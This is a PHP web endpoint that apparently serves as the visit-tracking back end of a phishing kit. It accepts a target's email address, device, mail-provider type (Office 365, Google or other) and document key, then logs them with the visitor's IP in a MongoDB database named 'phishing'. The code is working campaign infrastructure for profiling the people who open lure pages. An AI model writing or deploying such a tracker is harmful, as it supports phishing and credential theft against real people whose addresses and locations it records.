<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Only POST allowed
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

try {
    // Get POST data
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);

    if (!$data) {
        http_response_code(400);
        echo json_encode(['success' => false, 'error' => 'Invalid JSON data']);
        exit;
    }

    // Validate required fields
    if (empty($data['email']) || empty($data['device']) || empty($data['mx_type'])) {
        http_response_code(400);
        echo json_encode([
            'success' => false,
            'error' => 'Missing required fields: email, device, mx_type'
        ]);
        exit;
    }

    // Validate MX type
    $validMxTypes = ['office365', 'google', 'other'];
    $mxType = strtolower($data['mx_type']);
    if (!in_array($mxType, $validMxTypes)) {
        $mxType = 'other';
    }

    // Get IP address
    $ip = getClientIP();

    // Get MongoDB connection
    $mongo = getMongoClient();
    $db = $mongo->phishing;
    $visits = $db->visits;

    // Create visit record
    $visitData = [
        'ip' => $ip,
        'email' => $data['email'],
        'device' => $data['device'],
        'mx_type' => $mxType,
        'document_key' => $data['document_key'] ?? 'unknown',
        'timestamp' => new MongoDB\BSON\UTCDateTime()
    ];

    // Insert visit
    $result = $visits->insertOne($visitData);
    $visitId = (string)$result->getInsertedId();

    echo json_encode([
        'success' => true,
        'visit_id' => $visitId,
        'ip' => $ip,
        'mx_type' => $mxType,
        'document_key' => $data['document_key'] ?? 'unknown',
        'timestamp' => date('c')
    ]);

} catch (Exception $e) {
    error_log('Visit logging error: ' . $e->getMessage());
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => 'Failed to log visit',
        'details' => $e->getMessage()
    ]);
}

// ========== HELPER FUNCTIONS ==========

function getClientIP() {
    $headers = [
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_REAL_IP',
        'REMOTE_ADDR'
    ];

    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = $_SERVER[$header];
            if (strpos($ip, ',') !== false) {
                $ips = explode(',', $ip);
                $ip = trim($ips[0]);
            }
            return $ip;
        }
    }

    return 'unknown';
}

function getMongoClient() {
    $mongoUri = getenv('MONGODB_URI');
    
    if (!$mongoUri) {
        throw new Exception('MONGODB_URI not configured');
    }

    return new MongoDB\Client($mongoUri);
}
?>
